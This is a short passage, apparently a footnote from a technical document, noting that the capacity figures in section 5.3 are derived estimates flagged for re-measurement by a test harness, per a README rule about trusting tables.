§5.3 capacity numbers are derivations and are marked for re-measurement by
the harness, per README's own rule about trusting tables.*

